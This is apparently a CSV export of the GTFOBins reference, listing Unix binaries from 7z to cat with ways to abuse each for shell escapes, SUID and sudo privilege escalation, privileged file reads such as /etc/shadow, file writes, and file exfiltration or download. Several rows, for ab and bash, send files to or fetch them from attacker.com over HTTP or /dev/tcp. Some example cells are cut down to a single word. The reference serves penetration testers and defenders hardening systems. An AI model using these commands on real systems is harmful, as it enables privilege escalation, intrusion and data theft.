Binary,Function Name,Function URL,Description,Example
7z,File read,https://gtfobins.github.io/gtfobins/7z/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
7z,Sudo,https://gtfobins.github.io/gtfobins/7z/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aa-exec,Shell,https://gtfobins.github.io/gtfobins/aa-exec/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aa-exec /bin/sh
aa-exec,SUID,https://gtfobins.github.io/gtfobins/aa-exec/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
aa-exec,Sudo,https://gtfobins.github.io/gtfobins/aa-exec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ab,File upload,https://gtfobins.github.io/gtfobins/ab/#file-upload,It can exfiltrate files on the network.,"URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL"
ab,File download,https://gtfobins.github.io/gtfobins/ab/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_download
ab -v2 $URL"
ab,SUID,https://gtfobins.github.io/gtfobins/ab/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ab,Sudo,https://gtfobins.github.io/gtfobins/ab/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
agetty,SUID,https://gtfobins.github.io/gtfobins/agetty/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,File read,https://gtfobins.github.io/gtfobins/alpine/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
alpine -F ""$LFILE"""
alpine,SUID,https://gtfobins.github.io/gtfobins/alpine/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,Sudo,https://gtfobins.github.io/gtfobins/alpine/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-playbook,Shell,https://gtfobins.github.io/gtfobins/ansible-playbook/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF"
ansible-playbook,Sudo,https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-test,Shell,https://gtfobins.github.io/gtfobins/ansible-test/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ansible-test shell
ansible-test,Sudo,https://gtfobins.github.io/gtfobins/ansible-test/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aoss,Shell,https://gtfobins.github.io/gtfobins/aoss/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aoss /bin/sh
aoss,Sudo,https://gtfobins.github.io/gtfobins/aoss/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apache2ctl,File read,https://gtfobins.github.io/gtfobins/apache2ctl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
apache2ctl -c ""Include $LFILE"" -k stop"
apache2ctl,Sudo,https://gtfobins.github.io/gtfobins/apache2ctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt-get,Shell,https://gtfobins.github.io/gtfobins/apt-get/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt-get,Sudo,https://gtfobins.github.io/gtfobins/apt-get/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt,Shell,https://gtfobins.github.io/gtfobins/apt/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt,Sudo,https://gtfobins.github.io/gtfobins/apt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ar,File read,https://gtfobins.github.io/gtfobins/ar/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -u)
LFILE=file_to_read
ar r ""$TF"" ""$LFILE""
cat ""$TF"""
ar,SUID,https://gtfobins.github.io/gtfobins/ar/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ar,Sudo,https://gtfobins.github.io/gtfobins/ar/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aria2c,Command,https://gtfobins.github.io/gtfobins/aria2c/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x"
aria2c,File download,https://gtfobins.github.io/gtfobins/aria2c/#file-download,It can download remote files.,--allow-overwrite
aria2c,Sudo,https://gtfobins.github.io/gtfobins/aria2c/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aria2c,Limited SUID,https://gtfobins.github.io/gtfobins/aria2c/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
arj,File write,https://gtfobins.github.io/gtfobins/arj/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR"
arj,File read,https://gtfobins.github.io/gtfobins/arj/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -u)
LFILE=file_to_read
arj a ""$TF"" ""$LFILE""
arj p ""$TF"""
arj,SUID,https://gtfobins.github.io/gtfobins/arj/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
arj,Sudo,https://gtfobins.github.io/gtfobins/arj/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
arp,File read,https://gtfobins.github.io/gtfobins/arp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
arp -v -f ""$LFILE"""
arp,SUID,https://gtfobins.github.io/gtfobins/arp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
arp,Sudo,https://gtfobins.github.io/gtfobins/arp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
as,File read,https://gtfobins.github.io/gtfobins/as/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
as @$LFILE"
as,SUID,https://gtfobins.github.io/gtfobins/as/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
as,Sudo,https://gtfobins.github.io/gtfobins/as/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ascii-xfr,File read,https://gtfobins.github.io/gtfobins/ascii-xfr/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ascii-xfr -ns ""$LFILE"""
ascii-xfr,SUID,https://gtfobins.github.io/gtfobins/ascii-xfr/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ascii-xfr,Sudo,https://gtfobins.github.io/gtfobins/ascii-xfr/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ascii85,File read,https://gtfobins.github.io/gtfobins/ascii85/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ascii85 ""$LFILE"" | ascii85 --decode"
ascii85,Sudo,https://gtfobins.github.io/gtfobins/ascii85/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ash,Shell,https://gtfobins.github.io/gtfobins/ash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ash
ash,File write,https://gtfobins.github.io/gtfobins/ash/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'"
ash,SUID,https://gtfobins.github.io/gtfobins/ash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ash,Sudo,https://gtfobins.github.io/gtfobins/ash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aspell,File read,https://gtfobins.github.io/gtfobins/aspell/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
aspell -c ""$LFILE"""
aspell,SUID,https://gtfobins.github.io/gtfobins/aspell/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
aspell,Sudo,https://gtfobins.github.io/gtfobins/aspell/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
at,Shell,https://gtfobins.github.io/gtfobins/at/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null"
at,Command,https://gtfobins.github.io/gtfobins/at/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
echo ""$COMMAND"" | at now"
at,Sudo,https://gtfobins.github.io/gtfobins/at/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
atobm,File read,https://gtfobins.github.io/gtfobins/atobm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'"
atobm,SUID,https://gtfobins.github.io/gtfobins/atobm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
atobm,Sudo,https://gtfobins.github.io/gtfobins/atobm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
awk,Shell,https://gtfobins.github.io/gtfobins/awk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"awk 'BEGIN {system(""/bin/sh"")}'"
awk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
awk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/awk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
awk,File write,https://gtfobins.github.io/gtfobins/awk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
awk,File read,https://gtfobins.github.io/gtfobins/awk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
awk '//' ""$LFILE"""
awk,SUID,https://gtfobins.github.io/gtfobins/awk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
awk,Sudo,https://gtfobins.github.io/gtfobins/awk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
awk,Limited SUID,https://gtfobins.github.io/gtfobins/awk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
aws,Shell,https://gtfobins.github.io/gtfobins/aws/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
aws,Sudo,https://gtfobins.github.io/gtfobins/aws/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base32,File read,https://gtfobins.github.io/gtfobins/base32/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base32 ""$LFILE"" | base32 --decode"
base32,SUID,https://gtfobins.github.io/gtfobins/base32/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
base32,Sudo,https://gtfobins.github.io/gtfobins/base32/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base58,File read,https://gtfobins.github.io/gtfobins/base58/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base58 ""$LFILE"" | base58 --decode"
base58,Sudo,https://gtfobins.github.io/gtfobins/base58/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base64,File read,https://gtfobins.github.io/gtfobins/base64/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base64 ""$LFILE"" | base64 --decode"
base64,SUID,https://gtfobins.github.io/gtfobins/base64/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
base64,Sudo,https://gtfobins.github.io/gtfobins/base64/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
basenc,File read,https://gtfobins.github.io/gtfobins/basenc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64"
basenc,SUID,https://gtfobins.github.io/gtfobins/basenc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
basenc,Sudo,https://gtfobins.github.io/gtfobins/basenc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
basez,File read,https://gtfobins.github.io/gtfobins/basez/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
basez ""$LFILE"" | basez --decode"
basez,SUID,https://gtfobins.github.io/gtfobins/basez/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
basez,Sudo,https://gtfobins.github.io/gtfobins/basez/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bash,Shell,https://gtfobins.github.io/gtfobins/bash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,bash
bash,Reverse shell,https://gtfobins.github.io/gtfobins/bash/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
bash,File upload,https://gtfobins.github.io/gtfobins/bash/#file-upload,It can exfiltrate files on the network.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'"
bash,File download,https://gtfobins.github.io/gtfobins/bash/#file-download,It can download remote files.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'"
bash,File write,https://gtfobins.github.io/gtfobins/bash/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'"
bash,File read,https://gtfobins.github.io/gtfobins/bash/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'"
bash,Library load,https://gtfobins.github.io/gtfobins/bash/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,bash -c 'enable -f ./lib.so x'
bash,SUID,https://gtfobins.github.io/gtfobins/bash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bash,Sudo,https://gtfobins.github.io/gtfobins/bash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
batcat,Shell,https://gtfobins.github.io/gtfobins/batcat/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"batcat --paging always /etc/profile
!/bin/sh"
batcat,Sudo,https://gtfobins.github.io/gtfobins/batcat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
batcat,Limited SUID,https://gtfobins.github.io/gtfobins/batcat/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
bc,File read,https://gtfobins.github.io/gtfobins/bc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
bc -s $LFILE
quit"
bc,SUID,https://gtfobins.github.io/gtfobins/bc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bc,Sudo,https://gtfobins.github.io/gtfobins/bc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bconsole,Shell,https://gtfobins.github.io/gtfobins/bconsole/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"bconsole
@exec /bin/sh"
bconsole,File read,https://gtfobins.github.io/gtfobins/bconsole/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",bconsole -c /etc/shadow
bconsole,Sudo,https://gtfobins.github.io/gtfobins/bconsole/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bpftrace,Sudo,https://gtfobins.github.io/gtfobins/bpftrace/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bridge,File read,https://gtfobins.github.io/gtfobins/bridge/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
bridge -b ""$LFILE"""
bridge,SUID,https://gtfobins.github.io/gtfobins/bridge/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bridge,Sudo,https://gtfobins.github.io/gtfobins/bridge/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bundle,Shell,https://gtfobins.github.io/gtfobins/bundle/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
bundle,Sudo,https://gtfobins.github.io/gtfobins/bundle/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bundler,Shell,https://gtfobins.github.io/gtfobins/bundler/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
bundler,Sudo,https://gtfobins.github.io/gtfobins/bundler/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
busctl,Shell,https://gtfobins.github.io/gtfobins/busctl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
busctl,SUID,https://gtfobins.github.io/gtfobins/busctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
busctl,Sudo,https://gtfobins.github.io/gtfobins/busctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
busybox,Shell,https://gtfobins.github.io/gtfobins/busybox/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,busybox sh
busybox,Reverse shell,https://gtfobins.github.io/gtfobins/busybox/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -lvp 12345
busybox,File upload,https://gtfobins.github.io/gtfobins/busybox/#file-upload,It can exfiltrate files on the network.,"LPORT=12345
busybox httpd -f -p $LPORT -h ."
busybox,File write,https://gtfobins.github.io/gtfobins/busybox/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
busybox sh -c 'echo ""DATA"" > $LFILE'"
busybox,File read,https://gtfobins.github.io/gtfobins/busybox/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
./busybox cat ""$LFILE"""
busybox,SUID,https://gtfobins.github.io/gtfobins/busybox/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
busybox,Sudo,https://gtfobins.github.io/gtfobins/busybox/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
byebug,Shell,https://gtfobins.github.io/gtfobins/byebug/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue"
byebug,Sudo,https://gtfobins.github.io/gtfobins/byebug/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
byebug,Limited SUID,https://gtfobins.github.io/gtfobins/byebug/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
bzip2,File read,https://gtfobins.github.io/gtfobins/bzip2/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
bzip2 -c $LFILE | bzip2 -d"
bzip2,SUID,https://gtfobins.github.io/gtfobins/bzip2/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bzip2,Sudo,https://gtfobins.github.io/gtfobins/bzip2/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
c89,Shell,https://gtfobins.github.io/gtfobins/c89/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"c89 -wrapper /bin/sh,-s ."
c89,File write,https://gtfobins.github.io/gtfobins/c89/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_delete
c89 -xc /dev/null -o $LFILE"
c89,File read,https://gtfobins.github.io/gtfobins/c89/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
c89 -x c -E ""$LFILE"""
c89,Sudo,https://gtfobins.github.io/gtfobins/c89/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
c99,Shell,https://gtfobins.github.io/gtfobins/c99/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"c99 -wrapper /bin/sh,-s ."
c99,File write,https://gtfobins.github.io/gtfobins/c99/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_delete
c99 -xc /dev/null -o $LFILE"
c99,File read,https://gtfobins.github.io/gtfobins/c99/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
c99 -x c -E ""$LFILE"""
c99,Sudo,https://gtfobins.github.io/gtfobins/c99/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cabal,Shell,https://gtfobins.github.io/gtfobins/cabal/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cabal exec -- /bin/sh
cabal,SUID,https://gtfobins.github.io/gtfobins/cabal/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cabal,Sudo,https://gtfobins.github.io/gtfobins/cabal/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cancel,File upload,https://gtfobins.github.io/gtfobins/cancel/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
capsh,Shell,https://gtfobins.github.io/gtfobins/capsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,capsh --
capsh,SUID,https://gtfobins.github.io/gtfobins/capsh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
capsh,Sudo,https://gtfobins.github.io/gtfobins/capsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cat,File read,https://gtfobins.github.io/gtfobins/cat/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cat ""$LFILE"""
